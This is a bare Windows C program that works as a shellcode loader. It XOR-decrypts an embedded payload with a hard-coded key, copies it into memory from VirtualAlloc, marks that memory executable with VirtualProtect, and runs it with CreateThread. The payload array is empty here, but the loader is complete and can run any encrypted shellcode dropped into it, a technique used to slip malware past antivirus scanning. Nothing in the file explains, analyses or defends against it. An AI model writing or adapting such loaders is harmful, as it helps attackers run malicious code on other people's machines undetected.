#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// payload
unsigned char payload[] = {};
unsigned int payload_len = sizeof(payload);

// master key
char my_secret_key[] = "handler()";

// XOR function to decrypt data
void XOR(char * data, size_t data_len, char * key, size_t key_len) {
    int j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}

int main(void) {
    void * payload_mem; 
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    // Allocate a memory buffer for the payload
    payload_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Decrypt the payload
    XOR((char *) payload, payload_len, my_secret_key, sizeof(my_secret_key));

    // copy payload to the buffer memory
    RtlMoveMemory(payload_mem, payload, payload_len);

    // make new buffer memory as the executable
    rv = VirtualProtect(payload_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
    if ( rv != 0 ) {

        // execute the payload
        th = CreateThread(0, 0,
        (LPTHREAD_START_ROUTINE) payload_mem,
        0, 0, 0);
        WaitForSingleObject(th, -1);
    }
    return 0;
}
